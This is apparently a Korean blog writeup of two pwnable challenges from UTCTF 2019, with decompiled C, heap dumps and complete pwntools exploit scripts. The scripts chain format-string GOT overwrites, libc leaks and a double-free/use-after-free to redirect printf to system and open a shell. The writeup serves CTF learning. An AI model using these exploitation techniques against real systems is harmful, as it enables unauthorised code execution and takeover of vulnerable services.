---
title: Utctf Writeup
date: 2019-03-11
---

# pwnable1 (문제 이름을 모르겠다)

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  char s; // [esp+1Ah] [ebp-3Eh]
  unsigned int v4; // [esp+4Ch] [ebp-Ch]

  v4 = __readgsdword(0x14u);
  setbuf(stdin, 0);
  setbuf(stdout, 0);
  puts("Give me a string to echo back.");
  fgets(&s, 50, stdin);
  printf(&s);
  exit(0);
}
```

2개밖에 못 풀었으니 1번과 2번으로 나눈다.

바이너리는 굉장히 간단한데 exit가 있기 때문에 ret가 없으므로 exit_got를 main의 fgets로 바꿔서 계속 돌리면서 포맷스트링을 진행했다.

```python
from pwn import *

#t = process('./pwnable')
t = remote('stack.overflow.fail', 9002)

egot = 0x804a01c
main = 0x0804851b
a = 0x08048572
pgot = 0x804a010

b = a & 0xffff
c = a >> 16
b = b - c

t.recvuntil("back.")
p = "aa" + p32(egot) + p32(egot+2)
p += "%" + str(c-len(p)) + "c%12$hn"
p += "%" + str(b) + "c%11$hn"
t.sendline(p)
t.sendline("%2$p")
t.recvline()
t.recvline()

stdin = int(t.recv(10),16)
#libc = stdin - 0x1b25a0
libc = stdin - 0x1b05a0
log.success(hex(libc))
#sys = libc+0x3ada0
sys = libc + 0x3a940
log.success(hex(sys))

sys1 = sys & 0xffff
sys2 = sys >> 16
pause()
'''
t.sendline("%7$p")
t.recvline()
stack = int(t.recv(10),16)
log.success(hex(stack))
ret = stack - 0x90
'''

p = "aa" + p32(pgot) + p32(pgot+2)
p += "%" + str(sys1-10) + "c%13$hn"
p += "%" + str(sys2-sys1) + "c%14$hn"
t.sendline(p)
t.sendline('/bin/sh\x00')

t.interactive()
```

exit_got -> main_fgets 계속 돌리고 

leak -> printf_got (system overwrite) 이런식으로 풀었는데 립시 맞추는데 좀 고생했다.. 립시 없이 풀 수 있는건지 잘모르겠다 ㅠㅠ 나는 그것밖에 안보였기에… 

<br>

# pwnable2 (Jendy's)

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int *v3; // rsi
  const char *v4; // rdi
  int v6; // [rsp+1Ch] [rbp-14h]
  const char *v7; // [rsp+20h] [rbp-10h]
  unsigned __int64 v8; // [rsp+28h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  setbuf(stdin, 0LL);
  v3 = 0LL;
  setbuf(stdout, 0LL);
  v4 = (const char *)32;
  v7 = (const char *)malloc(0x20uLL);
  while ( 1 )
  {
    print_menu(v4, v3);
    v3 = &v6;
    __isoc99_scanf("%d%*c", &v6);
    switch ( v6 )
    {
      case 1:
        v4 = v7;
        add_name((__int64)v7);
        break;
      case 2:
        v4 = v7;
        add_item((__int64)v7);
        break;
      case 3:
        v4 = v7;
        remove_item((__int64)v7);
        break;
      case 4:
        v4 = v7;
        view_order((__int64)v7);
        break;
      case 5:
        checkout();
        return 0;
      default:
        v4 = "Not a valid choice!";
        puts("Not a valid choice!");
        break;
    }
  }
}
```

이 대회 심볼 살아있어서 너무 좋았음 (편-안)

아무튼 add_name, add_item, remove_item, view_order 요렇게 있고 처음에 chunk하나 할당해서 count랑 name chunk pointer, item chunk pointer를 사용한다. (아마 구조체일텐데 살리는법을 모른다..)

```c
char *__fastcall add_name(__int64 a1)
{
  puts("What is your name?");
  *(_QWORD *)(a1 + 16) = malloc(0x20uLL);
  return fgets(*(char **)(a1 + 16), 32, stdin);
}
```

쓰는 부분이 요 것뿐.. 근데 0x20만큼 써버리면 오버되서 새로운 chunk가 탄생함… 개행이 붙고 그 뒤에 널까지 붙어버린다. (대체 무엇..)

```c
unsigned __int64 __fastcall add_item(__int64 a1)
{
  size_t v1; // rax
  int v3; // [rsp+10h] [rbp-20h]
  unsigned int i; // [rsp+14h] [rbp-1Ch]
  char *dest; // [rsp+18h] [rbp-18h]
  __int64 v6; // [rsp+20h] [rbp-10h]
  unsigned __int64 v7; // [rsp+28h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  puts("Which item would you like to order from Jendy's?");
  for ( i = 0; (signed int)i <= 4; ++i )
    printf("%d. %s\n", i, (&options)[i]);
  __isoc99_scanf("%d%*c", &v3);
  if ( v3 >= 0 && v3 <= 4 )
  {
    dest = (char *)malloc(0x20uLL);
    v1 = strlen((&options)[v3]);
    strncpy(dest, (&options)[v3], v1);
    v6 = *(_QWORD *)a1;
    ++*(_DWORD *)(a1 + 24);
    if ( v6 )
      *(_QWORD *)(*(_QWORD *)(a1 + 8) + 24LL) = dest;
    else
      *(_QWORD *)a1 = dest;
    *(_QWORD *)(a1 + 8) = dest;
  }
  else
  {
    puts("Not a valid option!");
  }
  return __readfsqword(0x28u) ^ v7;
}

Which item would you like to order from Jendy's?
0. Four for Four
1. Nuggies
2. Frosty
3. Peppercorn Mushroom Melt
4. Dave's Single
```

item 추가인데 이미 하드코딩 되어있는 스트링을 가져다 박는다. 

메뉴는 저렇게 고를 수가 있다. item은 여러개 생성하면

 if ( v6 )
*(_QWORD *)(*(_QWORD *)(a1 + 8) + 24LL) = dest;

요기 single linked list처럼 포인터가 생긴다. 3번 item이 딱 저 포인터까지 길이가 되어 출력하면 heap leak이 가능하다. (알려주신 @shpik님 감사합니다!!!)

```c
unsigned __int64 __fastcall remove_item(__int64 a1)
{
  int v2; // [rsp+10h] [rbp-20h]
  int i; // [rsp+14h] [rbp-1Ch]
  void *ptr; // [rsp+18h] [rbp-18h]
  _QWORD *v5; // [rsp+20h] [rbp-10h]
  unsigned __int64 v6; // [rsp+28h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  puts("Please enter the number of the item from your order that you wish to remove");
  __isoc99_scanf("%d%*c", &v2);
  if ( v2 >= 0 )
  {
    ptr = *(void **)a1;
    v5 = 0LL;
    if ( v2 || !ptr || v2 )
    {
      for ( i = 0; ptr && i != v2; ++i )
      {
        v5 = ptr;
        ptr = (void *)*((_QWORD *)ptr + 3);
      }
      if ( ptr && i == v2 )
      {
        if ( *(_DWORD *)(a1 + 24) - 1 == v2 )
        {
          free(*(void **)(a1 + 8));
          *(_QWORD *)(a1 + 8) = v5;
        }
        else
        {
          v5[3] = *((_QWORD *)ptr + 3);
          free(ptr);
        }
        --*(_DWORD *)(a1 + 24);
      }
    }
    else
    {
      free(ptr);
      *(_OWORD *)a1 = 0uLL;
      --*(_DWORD *)(a1 + 24);
    }
  }
  return __readfsqword(0x28u) ^ v6;
}
```

free.. 그 다음 item pointer도 함께 지워버리면서 free한다. 사실 완벽하게는 분석이 안된게 어떨때는 더블 프리가 되고 어떨때는 안되는데 아마 그 chunk pointer 구조체+ item pointer에 따라서 갈리는거 같다. 

```c
unsigned __int64 __fastcall view_order(__int64 a1)
{
  unsigned int i; // [rsp+14h] [rbp-3Ch]
  char *format; // [rsp+18h] [rbp-38h]
  char s; // [rsp+20h] [rbp-30h]
  unsigned __int64 v5; // [rsp+48h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  if ( *(_QWORD *)(a1 + 16) )
  {
    snprintf(&s, 0x28uLL, "Name: %s\n", *(_QWORD *)(a1 + 16));
    printf("%s", &s);
  }
  format = *(char **)a1;
  for ( i = 0; *(_DWORD *)(a1 + 24) > (signed int)i; ++i )
  {
    printf("Item #%d: ", i);
    printf(format);
    putchar(10);
    format = (char *)*((_QWORD *)format + 3);
  }
  return __readfsqword(0x28u) ^ v5;
}
```

출력 메뉴.. snprintf가있는데 뒤에 개행이계속 붙어서 사용하지 않았다. 그리고 아래 포맷스트링 취약점이 있는데 format 저녀석은 item name pointer이다.  chunk count 만큼 포문을 돈다. 

```c
gdb-peda$ x/32gx 0x603000
0x603000:	0x0000000000000000	0x0000000000000031
0x603010:	0x0000000000603040	0x00000000006030a0
0x603020:	0x0000000000000000	0x0000000000000003
0x603030:	0x0000000000000000	0x0000000000000031
0x603040:	0x726f662072756f46	0x00000072756f4620
0x603050:	0x0000000000000000	0x0000000000603070
0x603060:	0x0000000000000000	0x0000000000000031
0x603070:	0x007365696767754e	0x0000000000000000
0x603080:	0x0000000000000000	0x00000000006030a0
0x603090:	0x0000000000000000	0x0000000000000031
0x6030a0:	0x00007974736f7246	0x0000000000000000
0x6030b0:	0x0000000000000000	0x0000000000000000
```

0x603010에 item chunk를 시작으로 0x603058에 다음 item pointer를 타고타고 출력해준다.

아무튼 ! 일단 heap leak이 되고 double free가 되니 저 구조체 포인터를 덮어서 leak + 포맷스트링을 했다. 이것도 여러 스테이지로 나누어야 한다 ㅠ 

```python
from pwn import *

t = process('./pwnable2')
#t = remote('stack.overflow.fail', 9003)

r = lambda w: t.recvuntil(str(w))
s = lambda z: t.sendline(str(z))

def name(a):
	r(">")
	s("1")
	r("name?")
	s(str(a))

def item(it):
	r(">")
	s("2")
	r("4. Dave's Single")
	s(str(it))

def de(idx):
	r(">")
	s("3")
	r("Please enter the number of the item from your order that you wish to remove")
	s(str(idx))

def p():
	r(">")
	s("4")

printf_got = 0x602050

item(0)
item(3)
item(1)
p()
r("Item #1: Peppercorn Mushroom Melt")
heap = u64(t.recv(4).ljust(8,'\x00').replace('\n','')) - 0xa0
log.success("heap_base ==> " + hex(heap))

de(2)
de(1)
de(2)
de(0)

name("%" + str(printf_got) + "c%16$n" + "%2c%18$ln")
name(p64(heap))
name("a")
name("b")
name(p64(heap+0x40)*2 + p64(0x602018) + "\x01\x00\x00\x00")

p()
t.recvuntil("Name: ") 
libc = u64(t.recv(6).ljust(8,'\x00')) - 0x844f0
log.success("libc ==> " + hex(libc))
#sys = libc + 0x45216#libc + 0x45390
sys = libc + 0x45390
sys1 = sys >> 32
sys2 = sys & 0xffffffff
s1 = sys2 & 0xffff
s2 = sys2 >> 16
log.success("sys ==> " + hex(sys))
print hex(sys2), hex(s1), hex(s2)

item(4)
item(4)
de(2)
de(1)
de(2)
de(0)

if (s2 > s1) :
	name("%" + str(s1) + "c%24$hn" + "%" + str(s2 - s1) + "c%53$hn;sh\x00")
else :
	name("%" + str(s2) + "c%53$hn" + "%" + str(s1 - s2) + "c%24$hn;sh\x00")
name(p64(heap))
name("a") # 24n
name("cccc") # 53n
name(p64(heap+0x40)*2 + p64(heap + 0xa0) + "\x01\x00\x00\x00") 
p()

name("aa")
p()

t.interactive()
```

삐걱삐걱 거렸던건 처음 double free때 count를 2로 설정해서 포맷스트링을 연속으로 하려고했는데 그 후에 double free가 잘안되어서.. item을 free하고 name을 써서 uaf로 값을 쓰는거라 포인터가 많이 꼬이게 되는듯.. 이것도 역시나 printf를 사용했다! 그래도 편했던건 got를 덮을때 상위 4바이트는 똑같이 때문에 하위 4바이트만 해주면 된다는점? 

(@shpik님의 도움을 많이 받았다! 감사합니다!)